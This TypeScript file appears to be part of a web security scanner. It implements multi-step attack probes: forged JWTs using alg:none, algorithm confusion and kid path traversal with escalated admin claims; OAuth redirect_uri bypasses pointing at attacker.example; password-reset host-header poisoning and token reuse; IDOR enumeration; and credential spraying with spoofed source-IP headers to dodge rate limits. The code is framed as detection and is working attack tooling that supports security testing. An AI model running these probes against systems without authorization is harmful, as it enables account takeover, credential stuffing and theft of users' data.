/**
 * Multi-step flow-attack engines (selective Shannon Tier-5 port).
 *
 * Single-request scanners miss the flaws that only appear across a chain of
 * requests. These engines chain probes to expose:
 *
 *   auth-flow   — OAuth redirect_uri validation weakness, JWT signature-validation
 *                 flaws (alg:none, RS→HS confusion, kid injection), session
 *                 fixation / non-invalidation.
 *   reset-chain — password-reset host-header poisoning, reset-token leakage in
 *                 the HTTP response, token reuse after consumption.
 *   enum-spray  — enumerable object identifiers (IDOR at scale), missing rate
 *                 limiting on credential endpoints.
 *
 * Every probe is a detection: forged tokens/redirects are replayed against the
 * TARGET and acceptance is inferred from status/redirect/body deltas. Nothing is
 * ever sent to an attacker origin. Pure planners/classifiers are separated from
 * the network runners so detection logic is unit-testable without a live target.
 */

import { createHash } from 'node:crypto';
import type { IntelFinding } from './types.js';
import type { Probe } from './probe.js';

// ════════════════════════════ JWT (pure) ════════════════════════════

export interface DecodedJwt {
  readonly header: Record<string, unknown>;
  readonly payload: Record<string, unknown>;
  readonly signature: string;
}

function b64urlDecode(segment: string): string {
  const pad = segment.length % 4 === 0 ? '' : '='.repeat(4 - (segment.length % 4));
  return Buffer.from(segment.replace(/-/g, '+').replace(/_/g, '/') + pad, 'base64').toString('utf8');
}

function b64urlEncode(value: string): string {
  return Buffer.from(value, 'utf8').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

/** Does the string look like a three-segment JWT? */
export function looksLikeJwt(token: string): boolean {
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  return parts.slice(0, 2).every(p => /^[A-Za-z0-9_-]+$/.test(p) && p.length > 0);
}

/** Decode a JWT's header and payload, or null when it is not a valid JWT. */
export function decodeJwt(token: string): DecodedJwt | null {
  if (!looksLikeJwt(token)) return null;
  const [h, p, s] = token.split('.');
  try {
    const header = JSON.parse(b64urlDecode(h ?? '')) as Record<string, unknown>;
    const payload = JSON.parse(b64urlDecode(p ?? '')) as Record<string, unknown>;
    if (typeof header !== 'object' || typeof payload !== 'object') return null;
    return { header, payload, signature: s ?? '' };
  } catch {
    return null;
  }
}

/** Common privilege-escalation claim overrides applied to forged tokens. */
const ESCALATION_CLAIMS: Readonly<Record<string, unknown>> = Object.freeze({
  role: 'admin',
  roles: ['admin'],
  isAdmin: true,
  admin: true,
  scope: 'admin',
  is_staff: true,
});

/** Apply escalation overrides only for claims already present in the payload. */
function escalatePayload(payload: Record<string, unknown>): Record<string, unknown> {
  const next: Record<string, unknown> = { ...payload };
  let changed = false;
  for (const [key, value] of Object.entries(ESCALATION_CLAIMS)) {
    if (key in next) {
      next[key] = value;
      changed = true;
    }
  }
  if (!changed) next.role = 'admin';
  return next;
}

export interface JwtTamperVariant {
  readonly technique: string;
  readonly token: string;
  readonly description: string;
}

/**
 * Build forged token variants from a genuine token. None are validly signed;
 * acceptance of any by the server indicates a signature-validation flaw.
 */
export function buildJwtTamperVariants(token: string): JwtTamperVariant[] {
  const decoded = decodeJwt(token);
  if (!decoded) return [];
  const variants: JwtTamperVariant[] = [];
  const escalated = escalatePayload(decoded.payload);

  const noneHeader = { ...decoded.header, alg: 'none' };
  variants.push({
    technique: 'alg-none',
    token: `${b64urlEncode(JSON.stringify(noneHeader))}.${b64urlEncode(JSON.stringify(escalated))}.`,
    description: 'Header alg downgraded to "none" with escalated claims; acceptance means signatures are not verified.',
  });

  const noneCaseHeader = { ...decoded.header, alg: 'None' };
  variants.push({
    technique: 'alg-none-case',
    token: `${b64urlEncode(JSON.stringify(noneCaseHeader))}.${b64urlEncode(JSON.stringify(escalated))}.`,
    description: 'Header alg set to mixed-case "None" to bypass naive alg:none blocklists.',
  });

  const confusionHeader = { ...decoded.header, alg: 'HS256' };
  variants.push({
    technique: 'alg-confusion',
    token: `${b64urlEncode(JSON.stringify(confusionHeader))}.${b64urlEncode(JSON.stringify(escalated))}.${decoded.signature}`,
    description: 'Header alg forced to HS256 (RS→HS confusion) with escalated claims and the original signature retained.',
  });

  const kidHeader = { ...decoded.header, alg: 'HS256', kid: '../../dev/null' };
  variants.push({
    technique: 'kid-injection',
    token: `${b64urlEncode(JSON.stringify(kidHeader))}.${b64urlEncode(JSON.stringify(escalated))}.`,
    description: 'Injected a traversal "kid" pointing at an empty/known file so the signing key becomes empty/predictable.',
  });

  return variants;
}

// ════════════════════ OAuth redirect_uri (pure) ════════════════════

const ATTACKER_HOST = 'attacker.example';

export interface RedirectVariant {
  readonly technique: string;
  readonly redirectUri: string;
}

/** Build tampered redirect_uri candidates derived from the legitimate one. */
export function buildRedirectVariants(legitimateRedirect: string): RedirectVariant[] {
  let legit: URL;
  try {
    legit = new URL(legitimateRedirect);
  } catch {
    return [];
  }
  const legitOrigin = `${legit.protocol}//${legit.host}`;
  return [
    { technique: 'wholesale-swap', redirectUri: `https://${ATTACKER_HOST}/callback` },
    { technique: 'subdomain-append', redirectUri: `https://${legit.host}.${ATTACKER_HOST}/callback` },
    { technique: 'userinfo-confusion', redirectUri: `https://${ATTACKER_HOST}#@${legit.host}/callback` },
    { technique: 'at-confusion', redirectUri: `https://${legit.host}@${ATTACKER_HOST}/callback` },
    { technique: 'path-append', redirectUri: `${legitOrigin}/../@${ATTACKER_HOST}/callback` },
    { technique: 'open-path-traversal', redirectUri: `${legitOrigin}/redirect?url=https://${ATTACKER_HOST}` },
    { technique: 'backslash-confusion', redirectUri: `https://${legit.host}\\.${ATTACKER_HOST}/callback` },
  ];
}

/** The attacker host used in probes (for classifiers and report text). */
export function attackerHost(): string {
  return ATTACKER_HOST;
}

export interface RedirectProbeResponse {
  readonly status: number;
  readonly locationHeader?: string;
  readonly body: string;
}

/**
 * Decide whether a probe response indicates the tampered redirect_uri was
 * accepted: a 3xx whose Location points at the attacker host, or a body that
 * echoes the attacker host as an approved redirect target.
 */
export function classifyRedirectAcceptance(response: RedirectProbeResponse): boolean {
  const loc = response.locationHeader ?? '';
  if (response.status >= 300 && response.status < 400 && loc.length > 0) {
    try {
      const target = new URL(loc, 'https://placeholder.invalid');
      if (target.host.toLowerCase().includes(ATTACKER_HOST)) return true;
    } catch {
      if (loc.toLowerCase().includes(ATTACKER_HOST)) return true;
    }
  }
  if (response.status === 200 && response.body.toLowerCase().includes(`${ATTACKER_HOST}/callback`)) {
    return true;
  }
  return false;
}

// ════════════════════ reset-chain (pure) ════════════════════

const POISON_HOST = 'attacker.example';

export interface PoisonRequest {
  readonly technique: string;
  readonly headers: Readonly<Record<string, string>>;
}

export function buildResetPoisonRequests(host = POISON_HOST): PoisonRequest[] {
  return [
    { technique: 'host-override', headers: { host } },
    { technique: 'x-forwarded-host', headers: { 'x-forwarded-host': host } },
    { technique: 'x-forwarded-server', headers: { 'x-forwarded-server': host } },
    { technique: 'x-host', headers: { 'x-host': host } },
    { technique: 'forwarded', headers: { forwarded: `host=${host}` } },
    { technique: 'host-dual', headers: { host, 'x-forwarded-host': host } },
  ];
}

const TOKEN_PATTERN = /(?:token|reset[_-]?token|code|key)["'=:\s]+([A-Za-z0-9._-]{16,})/i;

export interface ResetResponseView {
  readonly status: number;
  readonly body: string;
  readonly locationHeader?: string;
}

export interface ResetClassification {
  readonly hostReflected: boolean;
  readonly leakedToken?: string;
}

/**
 * Classify a reset-request response: does it echo the injected host into a
 * link/body (poisoning), and does it leak a reset token in the response?
 */
export function classifyResetResponse(response: ResetResponseView, injectedHost: string): ResetClassification {
  const haystack = `${response.body}\n${response.locationHeader ?? ''}`;
  const hostReflected = haystack.toLowerCase().includes(injectedHost.toLowerCase());
  const match = haystack.match(TOKEN_PATTERN);
  const leakedToken = match?.[1];
  return { hostReflected, ...(leakedToken !== undefined ? { leakedToken } : {}) };
}

// ════════════════════ enum-spray (pure) ════════════════════

export function buildEnumUrls(template: string, from: number, to: number, max: number): string[] {
  const urls: string[] = [];
  for (let id = from; id <= to && urls.length < max; id += 1) {
    urls.push(template.replace('{id}', String(id)));
  }
  return urls;
}

export interface EnumResult {
  readonly id: string;
  readonly status: number;
  readonly bodyHash: string;
  readonly length: number;
}

export interface EnumVerdict {
  readonly enumerable: boolean;
  readonly accessibleCount: number;
  readonly distinctBodies: number;
}

/**
 * Enumerable when several identifiers return success with *distinct* bodies —
 * distinct content rules out a generic "not found" page returned with 200.
 */
export function classifyEnumeration(results: readonly EnumResult[]): EnumVerdict {
  const ok = results.filter(r => r.status >= 200 && r.status < 300 && r.length > 0);
  const distinct = new Set(ok.map(r => r.bodyHash));
  return {
    accessibleCount: ok.length,
    distinctBodies: distinct.size,
    enumerable: ok.length >= 3 && distinct.size >= 3,
  };
}

export function evasionHeaders(seed: number): Record<string, string> {
  const ip = `10.${(seed >> 8) & 0xff}.${seed & 0xff}.${(seed * 7 + 13) & 0xff}`;
  return {
    'x-forwarded-for': ip,
    'x-real-ip': ip,
    'x-client-ip': ip,
    'x-originating-ip': ip,
    forwarded: `for=${ip}`,
  };
}

export interface SprayAttempt {
  readonly username: string;
  readonly password: string;
  readonly headers: Readonly<Record<string, string>>;
}

export function buildSprayAttempts(
  usernames: readonly string[],
  passwords: readonly string[],
  limit = 40,
): SprayAttempt[] {
  const attempts: SprayAttempt[] = [];
  let seed = 1;
  for (const password of passwords) {
    for (const username of usernames) {
      if (attempts.length >= limit) return attempts;
      attempts.push({ username, password, headers: evasionHeaders(seed) });
      seed += 1;
    }
  }
  return attempts;
}

// ════════════════════════════ runners ════════════════════════════

export interface FlowRunContext {
  readonly probe: Probe;
  readonly aborted?: () => boolean;
  readonly onProgress?: (message: string) => void;
}

export interface AuthFlowInput extends FlowRunContext {
  /** Authorization endpoints to probe (discovered or operator-supplied). */
  readonly authorizeUrls: readonly string[];
  /** A protected endpoint that requires auth, for JWT/session replay. */
  readonly protectedUrl: string;
  /** A genuine bearer/JWT captured for the session, if available. */
  readonly bearerToken?: string;
  /** Legitimate redirect_uri registered for the client, if known. */
  readonly legitimateRedirectUri?: string;
  /** Pre-auth session cookie, for the fixation/non-invalidation probes. */
  readonly preAuthCookie?: string;
}

function withRedirectUri(authorizeUrl: string, redirectUri: string): string {
  try {
    const url = new URL(authorizeUrl);
    url.searchParams.set('redirect_uri', redirectUri);
    if (!url.searchParams.has('response_type')) url.searchParams.set('response_type', 'code');
    if (!url.searchParams.has('client_id')) url.searchParams.set('client_id', 't3mp3st-probe');
    return url.toString();
  } catch {
    const sep = authorizeUrl.includes('?') ? '&' : '?';
    return `${authorizeUrl}${sep}redirect_uri=${encodeURIComponent(redirectUri)}`;
  }
}

/** Auth-flow engine: OAuth redirect_uri + JWT validation + session lifecycle. */
export async function runAuthFlow(input: AuthFlowInput): Promise<IntelFinding[]> {
  const findings: IntelFinding[] = [];

  // ── OAuth redirect_uri validation ──
  for (const authorizeUrl of input.authorizeUrls) {
    if (input.aborted?.()) return findings;
    const variants = buildRedirectVariants(
      input.legitimateRedirectUri ?? new URL(authorizeUrl).origin,
    );
    for (const variant of variants) {
      if (input.aborted?.()) return findings;
      try {
        const response = await input.probe({ url: withRedirectUri(authorizeUrl, variant.redirectUri) });
        const accepted = classifyRedirectAcceptance({
          status: response.status,
          body: response.body,
          ...(response.headers.location !== undefined ? { locationHeader: response.headers.location } : {}),
        });
        if (accepted) {
          findings.push({
            source: 'auth-flow',
            id: `flow-redirect-${urlHash(authorizeUrl)}`,
            target: authorizeUrl,
            title: 'OAuth redirect_uri validation bypass',
            severity: 'high',
            location: authorizeUrl,
            description: `Authorization endpoint accepted a tampered redirect_uri (${variant.technique}) pointing at ${attackerHost()}, so an attacker can steal the authorization code/token. Payload redirect_uri: ${variant.redirectUri}`,
          });
          break;
        }
      } catch {
        /* probe failed — scope refusal or dead endpoint; next variant */
      }
    }
  }

  // ── JWT signature validation ──
  if (input.bearerToken && looksLikeJwt(input.bearerToken)) {
    for (const variant of buildJwtTamperVariants(input.bearerToken)) {
      if (input.aborted?.()) return findings;
      try {
        const response = await input.probe({
          url: input.protectedUrl,
          headers: { authorization: `Bearer ${variant.token}` },
        });
        // 401/403 = correctly refused. Anything else = the forged token was accepted.
        if (response.status !== 401 && response.status !== 403) {
          findings.push({
            source: 'auth-flow',
            id: `flow-jwt-${urlHash(input.protectedUrl)}`,
            target: input.protectedUrl,
            title: `JWT signature validation flaw (${variant.technique})`,
            severity: 'critical',
            location: input.protectedUrl,
            description: `A forged token (${variant.technique}: ${variant.description}) was accepted with HTTP ${response.status} where a valid signature is required — the server does not enforce token signatures.`,
          });
          break;
        }
      } catch {
        /* next variant */
      }
    }
  }

  // ── session non-invalidation ──
  if (input.preAuthCookie) {
    try {
      const response = await input.probe({
        url: input.protectedUrl,
        headers: { cookie: input.preAuthCookie },
      });
      if (response.status >= 200 && response.status < 300 && response.body.length > 0) {
        findings.push({
          source: 'auth-flow',
          id: `flow-session-${urlHash(input.protectedUrl)}`,
          target: input.protectedUrl,
          title: 'Pre-authentication session still valid',
          severity: 'medium',
          location: input.protectedUrl,
          description: 'A session identifier from BEFORE authentication is still accepted on a protected endpoint — sessions are not rotated at login (fixation/non-invalidation).',
        });
      }
    } catch {
      /* endpoint unreachable */
    }
  }

  return findings;
}

export interface ResetChainInput extends FlowRunContext {
  /** Password-reset request endpoints (discovered or operator-supplied). */
  readonly resetRequestUrls: readonly string[];
  /** Account identifier the reset is requested for (operator's own test account). */
  readonly account: string;
  /** Optional confirmation endpoint for the token-reuse probe. */
  readonly resetConfirmUrl?: string;
}

function resetBody(account: string): string {
  return `email=${encodeURIComponent(account)}&username=${encodeURIComponent(account)}`;
}

/** Reset-chain engine: host poisoning → token leak → token reuse. */
export async function runResetChain(input: ResetChainInput): Promise<IntelFinding[]> {
  const findings: IntelFinding[] = [];
  let capturedToken: string | undefined;

  for (const endpoint of input.resetRequestUrls) {
    if (input.aborted?.()) break;
    for (const poison of buildResetPoisonRequests()) {
      if (input.aborted?.()) break;
      try {
        const response = await input.probe({
          url: endpoint,
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded', ...poison.headers },
          body: resetBody(input.account),
        });
        const verdict = classifyResetResponse(
          {
            status: response.status,
            body: response.body,
            ...(response.headers.location !== undefined ? { locationHeader: response.headers.location } : {}),
          },
          POISON_HOST,
        );
        if (verdict.leakedToken && capturedToken === undefined) {
          capturedToken = verdict.leakedToken;
          findings.push({
            source: 'reset-chain',
            id: `flow-reset-poison-${urlHash(input.resetRequestUrls[0] ?? 'reset')}`,
            target: input.resetRequestUrls[0] ?? '',
            title: 'Password-reset token leaked in HTTP response',
            severity: 'high',
            location: endpoint,
            description: 'The password-reset request returned a reset token/code in the HTTP response body or redirect. Tokens must be delivered out-of-band (email); exposing them lets an attacker reset any account whose reset they can trigger.',
          });
        }
        if (verdict.hostReflected) {
          findings.push({
            source: 'reset-chain',
            id: `flow-reset-token-${urlHash(input.resetRequestUrls[0] ?? 'reset')}`,
            target: input.resetRequestUrls[0] ?? '',
            title: `Password-reset host-header poisoning (${poison.technique})`,
            severity: 'high',
            location: endpoint,
            description: `Injecting an attacker host via ${poison.technique} caused ${POISON_HOST} to be reflected into the reset link/response. The reset email will point at the attacker host, leaking the victim's reset token on click.`,
          });
          break;
        }
      } catch {
        /* next poison technique */
      }
    }
  }

  if (capturedToken && input.resetConfirmUrl && !input.aborted?.()) {
    try {
      const confirmUrl = `${input.resetConfirmUrl}${input.resetConfirmUrl.includes('?') ? '&' : '?'}token=${encodeURIComponent(capturedToken)}`;
      const headers = { 'content-type': 'application/x-www-form-urlencoded' };
      const body = 'password=T3mp3st-Probe-1!&password_confirm=T3mp3st-Probe-1!';
      const first = await input.probe({ url: confirmUrl, method: 'POST', headers, body });
      if (first.status < 400) {
        const second = await input.probe({ url: confirmUrl, method: 'POST', headers, body });
        if (second.status < 400) {
          findings.push({
            source: 'reset-chain',
            id: `flow-reset-chain-${urlHash(input.resetRequestUrls[0] ?? 'reset')}`,
            target: input.resetRequestUrls[0] ?? '',
            title: 'Password-reset token not invalidated after use',
            severity: 'high',
            location: input.resetConfirmUrl,
            description: `The same reset token was accepted on two consecutive confirm requests (status ${first.status} then ${second.status}). Single-use enforcement is missing, widening the window for token theft/replay.`,
          });
        }
      }
    } catch {
      /* confirm endpoint unreachable */
    }
  }

  return findings;
}

export interface EnumSprayInput extends FlowRunContext {
  /** URL template with a literal {id} placeholder for the enumeration sweep. */
  readonly accessUrlTemplate?: string;
  /** Discovered object URLs — trailing numeric ids become templates automatically. */
  readonly endpoints?: readonly { url: string }[];
  readonly enumRange?: { readonly from: number; readonly to: number };
  readonly maxEnumProbes?: number;
  /** Login endpoint + credential candidates for the rate-limit/spray probe. */
  readonly loginUrl?: string;
  readonly usernames?: readonly string[];
  readonly passwords?: readonly string[];
}

function urlHash(x: string): string {
  return createHash('sha256').update(x, 'utf8').digest('hex').slice(0, 12);
}

function hashBody(body: string): string {
  return createHash('sha256').update(body, 'utf-8').digest('hex').slice(0, 16);
}

function templatesFrom(input: EnumSprayInput): string[] {
  const templates = new Set<string>();
  if (input.accessUrlTemplate) templates.add(input.accessUrlTemplate);
  for (const ep of input.endpoints ?? []) {
    const m = ep.url.match(/^(.*\/(?:users?|accounts?|orders?|invoices?|documents?|files?|items?|profiles?)\/)\d+(\/?.*)$/i);
    if (m?.[1]) templates.add(`${m[1]}{id}${m[2] ?? ''}`);
  }
  return [...templates];
}

/** Enum-spray engine: object enumeration + rate-limit-evasion credential spray. */
export async function runEnumSpray(input: EnumSprayInput): Promise<IntelFinding[]> {
  const findings: IntelFinding[] = [];
  const max = input.maxEnumProbes ?? 50;
  const range = input.enumRange ?? { from: 1, to: max };

  for (const template of templatesFrom(input)) {
    if (input.aborted?.()) return findings;
    const results: EnumResult[] = [];
    for (const url of buildEnumUrls(template, range.from, range.to, max)) {
      if (input.aborted?.()) return findings;
      try {
        const response = await input.probe({ url });
        results.push({ id: url, status: response.status, bodyHash: hashBody(response.body), length: response.body.length });
      } catch {
        /* unreachable — skip */
      }
    }
    const verdict = classifyEnumeration(results);
    if (verdict.enumerable) {
      findings.push({
        source: 'enum-spray',
        id: `flow-enum-idor-${urlHash(template)}`,
        target: template,
        title: 'Broken object-level authorization (enumerable objects)',
        severity: 'high',
        location: template,
        description: `Sweeping identifiers over ${template} returned ${verdict.accessibleCount} readable objects with ${verdict.distinctBodies} distinct bodies without per-object authorization, allowing bulk IDOR harvesting of other users' records.`,
      });
    }
  }

  if (input.loginUrl && input.usernames?.length && input.passwords?.length) {
    const attempts = buildSprayAttempts(input.usernames, input.passwords);
    let throttled = 0;
    let authed: SprayAttempt | undefined;
    let lastStatus = 0;
    for (const attempt of attempts) {
      if (input.aborted?.()) break;
      try {
        const response = await input.probe({
          url: input.loginUrl,
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded', ...attempt.headers },
          body: `username=${encodeURIComponent(attempt.username)}&password=${encodeURIComponent(attempt.password)}`,
        });
        lastStatus = response.status;
        if (response.status === 429) throttled += 1;
        if (response.status >= 200 && response.status < 300) authed = attempt;
        if (throttled >= 2) break; // rate limiting observed — stop probing
      } catch {
        break;
      }
    }
    if (throttled === 0 && attempts.length >= 5 && lastStatus !== 0) {
      findings.push({
        source: 'enum-spray',
        id: `flow-no-ratelimit-${urlHash(input.loginUrl)}`,
        target: input.loginUrl,
        title: 'No rate limiting on credential endpoint',
        severity: 'medium',
        location: input.loginUrl,
        description: `${attempts.length} credential attempts with rotating source-IP headers produced no 429/lockout response (last status ${lastStatus}). Credential stuffing at scale is unimpeded.`,
      });
    }
    if (authed) {
      findings.push({
        source: 'enum-spray',
        id: `flow-weak-cred-${urlHash(input.loginUrl)}`,
        target: input.loginUrl,
        title: 'Weak credential accepted',
        severity: 'high',
        location: input.loginUrl,
        description: `Candidate credential for "${authed.username}" authenticated successfully — test credentials aside, this indicates guessable/default credentials on a real account.`,
      });
    }
  }

  return findings;
}
